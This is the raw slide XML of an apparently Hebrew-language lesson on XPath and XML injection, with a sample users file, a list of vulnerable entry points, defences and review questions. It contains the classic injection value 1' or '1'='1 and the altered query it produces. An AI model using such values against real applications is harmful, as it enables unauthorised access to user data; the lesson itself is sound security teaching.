            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt;name&gt;John Doe&lt;/name&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt;email&gt;john@example.com&lt;/email&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;/user&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;user id="2"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt;name&gt;Jane Smith&lt;/name&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        &lt;email&gt;jane@example.com&lt;/email&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;/user&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/users&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41841664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702FC8-2F92-4261-BAD1-17BDED5EFA33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1808922" y="642594"/>
            <a:ext cx="9316278" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - איך עובד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XPath Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{11ACB2FF-AFA2-46C2-B04F-12FF2AAA126E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1103243" y="2220402"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאילתת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XPath </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמבקשת את פרטי המשתמש לפי מזהה משתמש יכולה להיראות כך:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/users/user[@id='1']</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם היישום מקבל את מזהה המשתמש מהמשתמש (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>user input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>) ומבצע את השאילתה בצורה ישירה על המסמך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, תוקף יכול לנסות להזריק קוד זדוני כדי לשנות את התוצאה של השאילתה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="176231001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F885628-8971-4916-82AC-576EC79F4EB3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2375452" y="642594"/>
            <a:ext cx="8749748" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איפה ניתן לבצע </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XPath Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{359A2A29-3499-4000-AC32-C66CE46C86C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שדות חיפוש</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כאשר המערכת מאפשרת חיפוש בעזרת מילות מפתח או פרמטרים אחרים באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>טפסים עם קלט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שדות שבהם המשתמש מזין נתונים, והמערכת מבצעת שאילתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עם הערכים שניתנים על ידי המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>פרמטרים ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם האפליקציה מקבלת פרמטרים דרך ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ומבצעת איתם שאילתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="414554542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FF5E022-C399-4158-81CD-4065296F0BF9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7136296" y="642594"/>
            <a:ext cx="3988904" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה להתקפה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5D9CBD93-5DE2-4BC7-8DCD-7D909A8CD4B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שהיישום שלך מבצע את השאילתה הבאה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/users/user[@id='input']</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאשר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא מה שהמשתמש הזין. אם התוקף מזין את הערך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1' or '1'='1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> השאילתה תהפוך ל:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/users/user[@id='1' or '1'='1']</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השאילתה הזו תוחזר את כל המשתמשים במסמך</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כי התנאי '1'='1' תמיד נכון.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12155312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44A1CC0-DFF0-4F51-86B3-51F896A2D794}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="642594"/>
            <a:ext cx="5029200" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך להגן על עצמך?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{70920F24-2E7D-450A-B09D-85F495D37F2E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>השתמש בהכנה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כאשר אתה מבצע שאילתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ,XPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השתמש בשיטות להכנה כדי להבטיח שהקלט מהמשתמש לא יגרום לבעיה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סינון קלט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: סנן את הקלט מהמשתמש כדי להבטיח שהוא מכיל רק את הערכים הצפויים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגבלת הרשאות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הקצה הרשאות מינימליות למסמכי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי למנוע גישה לנתונים רגישים.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="404978504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9E98E0A-B0DF-41D8-BFA7-7A21C1F2A30A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9104242" y="642594"/>
            <a:ext cx="2020957"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F7EA9DE3-F97A-4A31-9EF7-10AC86A84431}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. איך מתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XPath Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יכולה להשפיע על יישום המשתמש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. איזה קוד זדוני יוכל להתבצע אם תוקף יזין את הערך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1' or '1'='1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בתיבת חיפוש?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. איך אפשר לוודא שהקלט מהמשתמש לא יגרום ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XPath Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="410966467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686855F-4918-4068-86C0-A3CDE2C30FF1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9004852" y="642594"/>
            <a:ext cx="2120348"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C58DD5A5-B5D6-4942-93EB-D4F842626913}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XPath </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא שפה המאפשרת למשתמשים לחפש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ולהנגיש</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> נתונים מתוך מסמכי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. היא מספקת דרך לחפש אלמנטים וערכים במסמכים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>באמצעות ביטויים שמגדירים את מבנה הנתונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. מתקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XPath Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יכולה לשנות את השאילתות המבוצעות על המסמכים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לחשוף נתונים רגישים, לקבל גישה למידע שלא היה מיועד למתקפה, או לגרום לקריסת היישום. המתקפה מתבצעת על ידי הזרקת קוד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XPath </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זדוני לשאילתות שמבצע היישום.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. אם תוקף יזין את הערך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1' or '1'='1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> השאילתה שיבוצע תצא לדרך היא:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/users/user[@id='1' or '1'='1']</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   א. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>השתמש באימות קלט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ודא שהקלט מהמשתמש נבדק ומאומת לפני שהוא משולב בשאילתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ב. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>השתמש בתווים בטוחים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: המנע מקלט המכיל תווים מיוחדים שיכולים לשמש בהתקפות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XPath Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>', or, =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ג. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש בטכניקות של הכנה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: השתמש בשיטות להכנה או טכניקות נוספות שיכולות למנוע הזרקת קוד לא רצוי לתוך שאילתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="152009614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A1E6F5E5-72E5-401B-B9B0-05793EAB9216}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2361538"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="7200" dirty="0"/>
              <a:t>XML Injection</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="7200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="194673774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F076635-FFA0-4AC6-8AEF-0C4A0F347994}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5019260" y="642594"/>
            <a:ext cx="6105939" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E8A577B1-F7CA-4DEE-91C8-35A77C4A0D6C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2480807"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא סוג של התקפה על יישומים המשתמשים בקבצי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לצורך אחסון נתונים, תקשורת או קונפיגורציה. בהתקפה זו, תוקף מנצל פרצות בקלט של המשתמש כדי להזריק קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זדוני לתוך מסמך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XML</a:t>
            </a:r>
            <a:r>
